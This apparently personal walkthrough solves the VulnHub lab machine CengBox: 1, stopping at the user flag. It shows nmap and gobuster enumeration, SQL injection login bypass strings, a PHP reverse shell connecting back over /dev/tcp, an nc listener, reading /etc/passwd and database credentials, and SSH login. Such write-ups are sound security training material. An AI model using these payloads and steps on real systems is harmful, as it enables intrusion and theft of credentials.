<div class="page">

# CengBox: 1

\

## 

## CengBox: 1

- **<span style="color:#5e5c64;">CengBox: 1</span>** :-

<!-- -->

- Download the machine : <https://www.vulnhub.com/entry/cengbox-1,475/>

![](images/3-1.png)

- Open ova file .
- Then click finish .
- Start the machine .

1.  <span style="color:#3f4043;">Network Scanning</span> :

- Find the machine IP :

<div class="codebox">

    nmap -sn 192.168.2.0/24

</div>

![](images/3-2.png)

- Run nmap master command :

<div class="codebox">

    nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.236

</div>

![](images/3-3.png)

- Find available port in the machine ( Optional ) :

<div class="codebox">

    nmap -v -p- 192.168.2.236

</div>

- 

<div class="codebox">

    nmap -sC -sV -A 192.168.2.236   

</div>

- This command runs an aggressive scan and uses the http-enum script to
  identify potential CGI directories .

<div class="codebox">

    nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.236

</div>

![](images/3-4.png)

1.  <span style="color:#3f4043;">Web Enumeration</span> :

- IP visit in browser : <http://192.168.2.236>

<!-- -->

- Directory brute force to find the endpoints :

<div class="codebox">

    gobuster dir -u http://192.168.2.236 -w /usr/share/wordlists/dirb/big.txt -x php,txt,html

</div>

![](images/3-5.png)

- Now again directory brute force in /masteradmin parameter :

<div class="codebox">

    gobuster dir -u http://192.168.2.236/masteradmin/ -w /usr/share/wordlists/dirb/big.txt -x php,txt,html

</div>

![](images/3-6.png)

- Found the endpoints :

<div class="codebox">

    db.php
    login.php
    upload.php

</div>

- Visit the endpoints : <http://192.168.2.236/masteradmin/db.php>
  <http://192.168.2.236/masteradmin/login.php>
  <http://192.168.2.236/masteradmin/login.php>

![](images/3-7.png)

- Try to login with SQL Queries :

<div class="codebox">

    '_'
    ::
    '&'
    '^'
    ' or '-'
    ' or ' '
    ' or '&'
    ' or '^'
    ' or '+'
    '-'

</div>

![](images/3-8.png) Login Successful .

- After login enter the upload.php page :
  <http://192.168.2.236/masteradmin/upload.php>

![](images/3-9.png)

1.  <span style="color:#3f4043;">Reverse Shell</span> :

- Upload any file but they can get the error .

<!-- -->

- Now inspect and view the source code :

![](images/3-10.png)

- Make a file and enter the reverse shell payload :

<div class="codebox">

    nano shell.ceng

</div>

- 

<div class="codebox">

    <?php `/bin/bash -c 'bash -i >& /dev/tcp/192.168.2.219/443 0>&1'`; ?>

</div>

![](images/3-11.png)

- Upload the file :

![](images/3-12.png)

- Start the listener :

<div class="codebox">

    nc -nlvp 443

</div>

- Call the file : <http://192.168.2.236/uploads/shell.ceng>

<!-- -->

- Finally got the reverse shell :

![](images/3-13.png)

- Navigate the directory :

<div class="codebox">

    cd /var/www/html/masteradmin

</div>

- Check the file list :

<div class="codebox">

    ls -lh

</div>

![](images/3-14.png)

- Read the db.php file :

<div class="codebox">

    cat db.php

</div>

![](images/3-15.png)

- Standard PTY upgrade command :

<div class="codebox">

    python3 -c 'import pty; pty.spawn("/bin/bash")'

</div>

![](images/3-16.png)

- Read the passwd file :

<div class="codebox">

    cat /etc/passwd

</div>

![](images/3-17.png)

1.  <span style="color:#3f4043;">Database Enumeration</span> :

- MySQL Access :

<div class="codebox">

    mysql -u root -p'SuperS3cR3TPassw0rd1!'

</div>

- List all databases :

<div class="codebox">

    SHOW DATABASES;

</div>

- Select the cengbox database :

<div class="codebox">

    USE cengbox;

</div>

- List available tables :

<div class="codebox">

    SHOW TABLES;

</div>

![](images/3-18.png)

- Show the admin data :

<div class="codebox">

    select * from admin;

</div>

- Exit from database :

<div class="codebox">

    exit;

</div>

![](images/3-19.png)

- Found username and password :

<div class="codebox">

    Username : masteradmin
    Password : C3ng0v3R00T1!

</div>

1.  <span style="color:#3f4043;">SSH Access</span> :

- SSH Login with cengover user :

<div class="codebox">

    ssh cengover@192.168.2.236

</div>

- Check the file list :

<div class="codebox">

    ls -lh

</div>

- Read the user.txt file :

<div class="codebox">

    cat user.txt

</div>

- Found the user flag :

<div class="codebox">

    8f7f6471e2e869f029a75c5de601d5e0

</div>

![](images/3-20.png)

</div>
